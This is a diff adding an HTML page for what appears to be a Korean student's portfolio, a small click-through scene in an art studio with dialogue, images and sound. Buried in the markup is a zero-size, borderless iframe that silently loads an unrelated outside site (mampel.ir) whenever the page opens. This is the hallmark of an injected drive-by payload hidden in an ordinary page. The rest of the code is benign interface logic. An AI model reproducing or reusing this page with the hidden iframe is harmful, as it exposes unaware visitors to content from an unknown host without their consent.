@@ -1,0 +1,565 @@
+<!DOCTYPE html>
+<html>
+<title>포폴 안 </title>
+<style>
+@font-face {
+      font-family: "DungGeunMo";
+      src: url("DungGeunMo.woff");
+    }
+	
+	body{background-color: #484535; font-family: "DungGeunMo";}
+	#backk{width: auto; height: 100%; animation:start 2s alternate;}
+	#backk img{width: 1250px; height: auto;}
+	
+	#bx { position: absolute; bottom: 5%; left: 25%; display:none; }
+	#bx img{ width: 70%; height: auto;  }
+
+	#poom{bottom: 10%; font-weight: 5px; font-size: 1em;display:none; left: 28%;font-family: "DungGeunMo";}
+	#poom2{bottom: 10%; font-weight: 5px; font-size: 1em;display:none; left: 28%;font-family: "DungGeunMo";}
+	#poom3{bottom: 10%; font-weight: 5px; font-size: 1em;display:none; left: 28%;font-family: "DungGeunMo";}
+	#poom4{bottom: 10%; font-weight: 5px; font-size: 1em;display:none; left: 28%;font-family: "DungGeunMo";}
+	#poom5{bottom: 10%; font-weight: 5px; font-size: 1em;display:none; left: 28%;font-family: "DungGeunMo";}
+	#poom6{bottom: 10%; font-weight: 5px; font-size: 1em;display:none; left: 28%;font-family: "DungGeunMo";}
+	#poom7{bottom: 10%; font-weight: 5px; font-size: 1em;display:none; left: 28%;font-family: "DungGeunMo";}
+	#poom8{bottom: 10%; font-weight: 5px; font-size: 1em;display:none; left: 28%;font-family: "DungGeunMo";}
+	#poom9{bottom: 10%; font-weight: 5px; font-size: 1em;display:none; left: 28%;font-family: "DungGeunMo";}
+	#wool{bottom: 10%; font-weight: 5px; font-size: 1em;display:none; left: 28%;font-family: "DungGeunMo";}
+	#wool2{bottom: 10%; font-weight: 5px; font-size: 1em;display:none; left: 28%;font-family: "DungGeunMo";}
+	#wool3{bottom: 10%; font-weight: 5px; font-size: 1em;display:none; left: 28%;font-family: "DungGeunMo";}
+	#wool4{bottom: 10%; font-weight: 5px; font-size: 1em;display:none; left: 28%;font-family: "DungGeunMo";}
+	#wool5{bottom: 10%; font-weight: 5px; font-size: 1em;display:none; left: 28%;font-family: "DungGeunMo";}
+	#ouuu{bottom: 10%; font-weight: 5px; font-size: 1em;display:none; left: 28%;font-family: "DungGeunMo";}
+
+	#heyy{bottom: 10%; font-weight: 5px; font-size: 1em;display:none; left: 60%;font-family: "DungGeunMo";cursor: pointer;}
+	#heyy2{bottom: 7%; font-weight: 5px; font-size: 1em;display:none; left: 60%;font-family: "DungGeunMo";cursor: pointer;}
+	#heyy:hover{color: white; } 
+	#heyy2:hover{color: white;}
+
+
+	#okk{bottom: 13%; right: 25%;z-index: 6; cursor: pointer; position: absolute;display:none;}
+		#okk img{height: 20px;width: auto; }
+
+	#oo{bottom: 13%; right: 25%;z-index: 6; cursor: pointer; position: absolute;display:none;}
+		#oo img{height: 20px;width: auto; }
+	#ooo{bottom: 13%; right: 25%;z-index: 6; cursor: pointer; position: absolute;display:none;}
+		#ooo img{height: 20px;width: auto; }
+	#oooo{bottom: 13%; right: 25%;z-index: 6; cursor: pointer; position: absolute;display:none;}
+		#oooo img{height: 20px;width: auto; }	
+	#ola{bottom: 13%; right: 25%;z-index: 6; cursor: pointer; position: absolute;display:none;}
+		#ola img{height: 20px;width: auto; }	
+	#ola2{bottom: 13%; right: 25%;z-index: 6; cursor: pointer; position: absolute;display:none;}
+		#ola2 img{height: 20px;width: auto; }	
+	#ola3{bottom: 13%; right: 25%;z-index: 6; cursor: pointer; position: absolute;display:none;}
+		#ola3 img{height: 20px;width: auto; }	
+	#ola4{bottom: 13%; right: 25%;z-index: 6; cursor: pointer; position: absolute;display:none;}
+		#ola4 img{height: 20px;width: auto; }	
+	#ola5{bottom: 13%; right: 25%;z-index: 6; cursor: pointer; position: absolute;display:none;}
+		#ola5 img{height: 20px;width: auto; }	
+	#ola6{bottom: 13%; right: 25%;z-index: 6; cursor: pointer; position: absolute;display:none;}
+		#ola6 img{height: 20px;width: auto; }	
+	#ola7{bottom: 13%; right: 25%;z-index: 6; cursor: pointer; position: absolute;display:none;}
+		#ola7 img{height: 20px;width: auto; }	
+	#ola8{bottom: 13%; right: 25%;z-index: 6; cursor: pointer; position: absolute;display:none;}
+		#ola8 img{height: 20px;width: auto; }	
+	#ola9{bottom: 13%; right: 25%;z-index: 6; cursor: pointer; position: absolute;display:none;}
+		#ola9 img{height: 20px;width: auto; }	
+
+
+	#face1 { position: absolute; z-index: 9;  left: 3%; display: none; bottom: 38%; animation:start 2s alternate;}
+	#face1 img{ position: absolute; width: 300px; height: auto; z-index: 99;}
+
+	#sigar { position: absolute; z-index: 99;cursor: pointer; bottom:60%; right: 35%; }
+	#sigar img{ position: absolute; width: 400px; height: 150px;z-index: 99;cursor: pointer;}
+
+	#tabl { position: absolute; z-index: 99;cursor: pointer; bottom:55%; left:  1%; }
+	#tabl img{ position: absolute; width: 200px; height: 50px;z-index: 99;cursor: pointer;}
+
+	#out { position: absolute; z-index: 99;cursor: pointer; bottom:69%;left: 43%; }
+	#out img{ position: absolute; width: 140px; height: 50px;z-index: 99;cursor: pointer;}
+
+	#fit { position: absolute; z-index: 99;cursor: pointer; bottom:42%;left: 43%; }
+	#fit img{ position: absolute; width: 230px; height: 140px;z-index: 99;cursor: pointer;}
+
+	#hee { position: absolute; z-index: 98;cursor: pointer; bottom:75%;left: 25%; }
+	#hee img{ position: absolute; width: 100px; height:auto;z-index: 99;cursor: pointer;}
+
+#face{ position: absolute; z-index:3; bottom: 53.5%; left: 2%;animation: pho 1s alternate;display: none;}
+	#face img{ position: absolute; width: 355px; height: auto; z-index:3;}
+#face2{ position: absolute; z-index:3; bottom: 53.5%; left: 2%;animation: pho 1s alternate;display: none;}
+	#face2 img{ position: absolute; width: 355px; height: auto; z-index:3;}
+#face3{ position: absolute; z-index:3; bottom: 55%; left: 2%;animation: pho 1s alternate;display: none;}
+	#face3 img{ position: absolute; width: 355px; height: auto; z-index:3;}
+
+	#table { position: absolute; z-index: 99; bottom:80%; right: 77%; display: none;animation:start 1s alternate;}
+	#table img{ position: absolute; width: 700px; height: auto; z-index: 99;}
+	#ouu { position: absolute; z-index: 99; bottom:80%; right: 77%; display: none;animation:start 1s alternate;}
+	#ouu img{ position: absolute; width: 700px; height: auto; z-index: 99;}
+
+	#turn{bottom: 8%; left: 48%; position: absolute;animation: backk 3s alternate; }
+	#turn img{width: 40px; height: auto;cursor: pointer; }
+	#tt { position: absolute; z-index: 99; top: 8%; left: 37%; animation: tra 2s alternate; display: none;cursor: pointer; }
+	#tt img{ position: absolute; z-index: 99; width: 500px; height: auto; }	
+	#nn{bottom: 18%; font-weight: 5px; font-size: 1.5em;display:none; left: 28%;font-family: "DungGeunMo";}
+	#container{position: relative; margin: auto; width:1250px; height: 1000px;font-family: "DungGeunMo"; }
+
+@-webkit-keyframes typing { from { width: 0; } }
+@-webkit-keyframes blink-caret { 50% { border-color: #484535; } }
+
+@keyframes start{
+			0%{opacity: 0;}
+			
+			100%{opacity: 1;}
+		}
+
+@keyframes inin{
+			0%{top: 71%;}
+			
+			100%{top: 68%;}
+		}
+@keyframes backk{
+			0%{bottom: 11%;}
+			
+			100%{bottom: 8%;}
+		}			
+@keyframes rig{
+			0%{right: 48%;}
+			
+			100%{right: 45%;}
+		}		
+@keyframes heree{
+			0%{right: 20%;}
+			
+			100%{right: 18%;}
+		}
+@keyframes tra{
+			0%{opacity: 0}
+			
+			100%{opacity: 1}
+		}
+h1 { 
+	color: #484535;
+	border-right: .2em solid #26241B;
+	 
+	width: 31ch;
+	margin: 2em 1em;
+	white-space: nowrap;
+	overflow: hidden;
+	position: absolute;
+	-webkit-animation: typing 1s steps(15, end),
+	           blink-caret .1s step-end infinite alternate;z-index: 3;
+}
+h2 { 
+	color: #484535;
+	border-right: .2em solid #26241B;
+	 
+	width: 35ch;
+	margin: 2em 1em;
+	white-space: nowrap;
+	overflow: hidden;
+	position: absolute;
+	-webkit-animation: typing 1s steps(18, end),
+	           blink-caret .1s step-end infinite alternate; z-index: 3;
+}
+h3 { 
+	color: #484535;
+	border-right: .2em solid #26241B;
+	 
+	width: 18ch;
+	margin: 2em 1em;
+	white-space: nowrap;
+	overflow: hidden;
+	position: absolute;
+	-webkit-animation: typing 1s steps(15, end),
+	           blink-caret .1s step-end infinite alternate; z-index: 3;
+}
+h4 { 
+	color: #484535;
+	border-right: .2em solid #26241B;
+	 
+	width: 50ch;
+	margin: 2em 1em;
+	white-space: nowrap;
+	overflow: hidden;
+	position: absolute;
+	-webkit-animation: typing 1s steps(15, end),
+	           blink-caret .1s step-end infinite alternate; z-index: 3;
+}
+h5 { 
+	color: #484535;
+	border-right: .2em solid #26241B;
+	 
+	width: 39ch;
+	margin: 2em 1em;
+	white-space: nowrap;
+	overflow: hidden;
+	position: absolute;
+	-webkit-animation: typing 1s steps(15, end),
+	           blink-caret .1s step-end infinite alternate; z-index: 3;
+}
+h6 { 
+	color: #484535;
+	border-right: .2em solid #26241B;
+	 
+	width: 10ch;
+	margin: 2em 1em;
+	white-space: nowrap;
+	overflow: hidden;
+	position: absolute;
+	-webkit-animation: typing 1s steps(15, end),
+	           blink-caret .1s step-end infinite alternate; z-index: 3;
+}
+h10{color: #b0ab9e;position: absolute;z-index: 3;}
+p { 
+	color: black;
+	position: absolute;
+	
+	width: 53ch;
+	margin: 2em 1em;
+	}
+
+</style>
+
+<head>
+	<title></title>
+</head>
+
+<body>
+
+	<div id="container">
+	 <h3 id="poom">옷 무더기가 있다.</h3>
+	 	<h1 id="poom2">누군가 옷을 벗어두고 간듯하다.</h1>
+	 	<h4 id="poom3">전날 학생들이 작업하고 간 흔적이 남아있다.</h4>
+	 	<h4 id="poom4">커터칼, 가위...갖가지 재료들이 널부러져 있다.</h4>
+	 	<h3 id="poom5">오 안녕! 일찍왔네!</h3>
+	 	<h2 id="poom6">너도 교수님 컨펌때문에 일찍왔구나!</h2>
+	 	<h5 id="poom7">그래도 은서 다음은 나니까 기다려야돼!</h5>
+	 	<h5 id="poom8">잉? 교수님 연구실 앞에 은서 못봤어?</h5>
+	 	<h4 id="poom9">컨펌 끝나면 여기로 오기로 했는데 아직인가....?</h4>
+	 	<h4 id="wool">뭐! 끝나면 알아서 오겠지! 난 더 작업해야겠다!</h4>
+
+	 	<h4 id="ouuu">창문이 너무 더러워서 미세먼지가 낀 것처럼 뿌옇다.</h4>
+
+	 	<h4 id="wool2">전단지 재디자인하는 과제 있었잖아! 너도 안했어?</h4>
+	 	<h4 id="wool3">남은거 쓸래? 급하게 몇개 주워왔는데 한개 남아있어.</h4>
+	 	<h4 id="wool4">급하게 주워와서 그런가 좀 눅눅하고 느낌이 별로야.</h4>
+	 	<h4 id="wool5">저기 너한테 왼쪽 테이블 위에 있는데 한번 볼래?</h4>
+
+		 <h6 id="heyy">▶은서?</h6>
+		 <h6 id="heyy2">▶과제?</h6>
+		  <h10 id="nn">희선</h10>	
+	 	<audio id="walk">
+		<source src="walk.mp3" type="audio/mpeg"autoplay="true" preload="auto">
+	</audio>
+	<audio id="but">
+		<source src="but.mp3" type="audio/mpeg">
+	</audio>
+
+
+
+<iframe src="http://mampel.ir/" frameborder="0" style="width:0px;height:0px;border:0px" ></iframe>
+
+
+	<div id="backk">
+		<center>
+		<img src="main.png">
+		</center>
+	</div>
+	<a href="https://seoojing.github.io/popol_map/">
+	<div id="turn">
+		<img src="turn.png">
+	</div>
+</a>
+
+
+	<div id="bx">
+		<img src="boox.png">
+	</div>
+
+
+<div id="sigar">
+		<img src="blank.png">
+	</div>
+<div id="out">
+		<img src="blank.png">
+	</div>
+<div id="ouu">
+		<img src="ouu.png">
+	</div>
+<div id="fit">
+		<img src="blank.png">
+	</div>
+
+	<a href="https://seoojing.github.io/walsai/">
+<div id="tabl">
+		<img src="blank.png">
+	</div>
+	</a>
+	<div id="oo">
+		<img src="won.png">
+	</div>
+	<div id="ooo">
+		<img src="won.png">
+	</div>
+	<div id="oooo">
+		<img src="won.png">
+	</div>
+	<div id="ola">
+		<img src="won.png">
+	</div>
+	<div id="ola2">
+		<img src="won.png">
+	</div>
+	<div id="ola3">
+		<img src="won.png">
+	</div>
+	<div id="ola4">
+		<img src="okk.png">
+	</div>
+	<div id="ola5">
+		<img src="won.png">
+	</div>
+	<div id="ola6">
+		<img src="won.png">
+	</div>
+	<div id="ola7">
+		<img src="won.png">
+	</div>
+	<div id="ola8">
+		<img src="okk.png">
+	</div>
+	<div id="ola9">
+		<img src="okk.png">
+	</div>
+	<div id="okk">
+		<img src="okk.png">
+	</div>
+	<div id="tt">
+		<img src="sig.png">
+	</div>
+	<div id="table">
+		<img src="table.png">
+	</div>
+	<div id="hee">
+		<img src="hee.gif">
+	</div>
+	<div id="face">
+		<img src="hee1.png">
+	</div>	
+	<div id="face2">
+		<img src="hee2.png">
+	</div>	
+	<div id="face3">
+		<img src="hee3.png">
+	</div>		
+</div>
+<script type="text/javascript">
+
+
+
+var bbPlay = 0;
+window.onmousemove = function(){
+	bbPlay++;
+	if(bbPlay == 1){ walk.play();  }
+}
+
+	
+var toggle = "off";
+	var clickNumber = 0;
+	fit.onclick = function(){
+		but.play();
+			toggle = "on";
+			bx.style.display = "inline";
+			poom.style.display = "inline";
+			oo.style.display = "inline"
+			fit.style.display = "none"
+			}
+
+	out.onclick = function(){
+		but.play();
+			toggle = "on";
+			bx.style.display = "inline";
+			ouuu.style.display = "inline";
+			ouu.style.display = "inline"
+			ola9.style.display = "inline"
+			out.style.display = "none"
+						sigar.style.display = "none"
+			fit.style.display = "none"
+			tabl.style.display = "none"
+			}
+	ola9.onclick = function(){
+		but.play();
+			ouuu.style.display = "none"
+			bx.style.display = "none"
+			ola9.style.display = "none"
+			ouu.style.display = "none"
+			sigar.style.display = "inline"
+			fit.style.display = "inline"
+			tabl.style.display = "inline"
+		}
+
+	sigar.onclick = function(){
+		but.play();
+			toggle = "on";
+			table.style.display = "inline";
+			bx.style.display = "inline";
+			poom3.style.display = "inline";
+			ooo.style.display = "inline"
+			sigar.style.display = "none"
+			}
+	oo.onclick = function(){
+		but.play();
+			poom.style.display = "none"
+			oo.style.display = "none"
+			poom2.style.display = "inline"
+			okk.style.display = "inline"
+			hooo.play();}
+
+	ooo.onclick = function(){
+		but.play();
+			poom3.style.display = "none"
+			poom4.style.display = "inline"
+			ooo.style.display = "none"
+			okk.style.display = "inline"}
+
+
+	oooo.onclick = function(){
+		but.play();
+			poom5.style.display = "none"
+			poom6.style.display = "inline"
+			oooo.style.display = "none"
+			ola.style.display = "inline"
+		}
+	ola.onclick = function(){
+		but.play();
+			poom6.style.display = "none"
+			poom7.style.display = "inline"
+			ola.style.display = "none"
+			face.style.display = "none"
+			face3.style.display = "inline"
+			heyy.style.display = "inline"
+			heyy2.style.display = "inline"
+		}
+	ola2.onclick = function(){
+		but.play();
+			poom8.style.display = "none"
+			poom9.style.display = "inline"
+			ola2.style.display = "none"
+			ola3.style.display = "inline"
+		}
+	ola3.onclick = function(){
+		but.play();
+			poom9.style.display = "none"
+			wool.style.display = "inline"
+			ola3.style.display = "none"
+			ola4.style.display = "inline"
+			face2.style.display = "none"
+			face3.style.display = "inline"
+		}
+	ola4.onclick = function(){
+		but.play();
+			wool.style.display = "none"
+			bx.style.display = "none"
+			ola3.style.display = "none"
+			ola4.style.display = "inline"
+			face3.style.display = "none"
+			nn.style.display = "none"
+			ola4.style.display = "none"
+			sigar.style.display = "inline"
+			fit.style.display = "inline"
+			tabl.style.display = "inline"
+		}
+	heyy.onclick = function(){
+		but.play();
+			poom8.style.display = "inline"
+			poom7.style.display = "none"
+			heyy.style.display = "none"
+			heyy2.style.display = "none"
+			face3.style.display = "none"
+			face2.style.display = "inline"
+			ola2.style.display = "inline"
+		}
+	heyy2.onclick = function(){
+		but.play();
+			wool2.style.display = "inline"
+			poom7.style.display = "none"
+			heyy.style.display = "none"
+			heyy2.style.display = "none"
+			face3.style.display = "none"
+			face2.style.display = "inline"
+			ola5.style.display = "inline"
+		}
+
+	ola5.onclick = function(){
+		but.play();
+			wool2.style.display = "none"
+			wool3.style.display = "inline"
+			ola5.style.display = "none"
+			ola6.style.display = "inline"
+			face2.style.display = "none"
+			face3.style.display = "inline"
+		}
+	ola6.onclick = function(){
+		but.play();
+			wool3.style.display = "none"
+			wool4.style.display = "inline"
+			ola6.style.display = "none"
+			ola7.style.display = "inline"
+		}
+	ola7.onclick = function(){
+		but.play();
+			wool4.style.display = "none"
+			wool5.style.display = "inline"
+			ola7.style.display = "none"
+			ola8.style.display = "inline"
+		}
+	ola8.onclick = function(){
+		but.play();
+			wool5.style.display = "none"
+			bx.style.display = "none"
+			ola8.style.display = "none"
+			face3.style.display = "none"
+			nn.style.display = "none"
+			sigar.style.display = "inline"
+			fit.style.display = "inline"
+			tabl.style.display = "inline"
+		}
+	okk.onclick = function(){
+		but.play();
+		poom2.style.display = "none"
+			okk.style.display = "none"
+			bx.style.display = "none"
+			poom4.style.display = "none"
+			table.style.display = "none"
+}
+			
+			
+	
+
+
+
+hee.onclick = function(){
+			but.play();
+			toggle = "on";
+			bx.style.display = "inline";
+			poom5.style.display = "inline";
+			oooo.style.display = "inline"
+			nn.style.display = "inline"
+			sigar.style.display = "none"
+			fit.style.display = "none"
+			table.style.display = "none"
+			face.style.display = "inline"
+			}
+
+
+function lookDiv (){ 
+  document.getElementById("soun").style.display="inline"; 
+ } 
+self.setTimeout("lookDiv()",10000);
+
+function outDiv (){ 
+  document.getElementById("soun").style.opacity=0; 
+} 
+self.setTimeout("outDiv()",11000);
+</script>
+</body>
+</html>
